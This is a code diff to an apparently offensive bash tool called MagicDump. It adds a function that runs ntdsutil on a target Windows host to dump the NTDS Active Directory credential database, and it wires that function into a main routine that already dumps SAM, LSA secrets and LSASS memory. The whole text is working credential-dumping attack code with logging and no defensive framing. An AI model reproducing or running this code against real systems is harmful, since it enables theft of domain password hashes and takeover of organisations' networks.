@@ -279,10 +279,39 @@ dump_lsass() {
   fi
 }
 
+# Function to execute NTDS dump using ntdsutil
+dump_ntds() {
+  # Define the output file path using TARGET_DUMP_DIR
+  local output_file="$TARGET_DUMP_DIR/NTDS_dump_${TARGET_HOST}.txt"
+
+  # Construct the command for NTDS dump
+  local cmd
+  cmd=$(construct_base_cmd)" -M ntdsutil > '$output_file' 2>&1"
+
+  # Log the operation
+  add_log "Starting NTDS dump using ntdsutil..."
+
+  # Run the command and process the results
+  if run_command "$cmd"; then
+    # Log success and store the output path in the JSON log
+    log_operation "NTDS" "success" "\"file_path\": \"$output_file\", \"method\": \"ntdsutil\""
+    add_log "NTDS dump saved to $output_file"
+
+    # Optionally parse or validate output
+    echo -e "${GREEN}[NTDS DUMP COMPLETED]:${RESET}"
+    grep -i "successfully" "$output_file" || echo -e "${YELLOW}No significant output parsed from NTDS dump.${RESET}"
+  else
+    # Log failure if the command did not succeed
+    log_operation "NTDS" "failed" "\"error\": \"Failed to dump NTDS using ntdsutil\""
+    add_warning "Failed to dump NTDS on target $TARGET_HOST using ntdsutil"
+  fi
+}
+
 # Main Logic
 add_log "Starting MagicDump against target $TARGET_HOST"
 add_log "Authenticating as user '$USERNAME'..."
 dump_sam
 dump_lsa
 dump_lsass
+dump_ntds
 echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
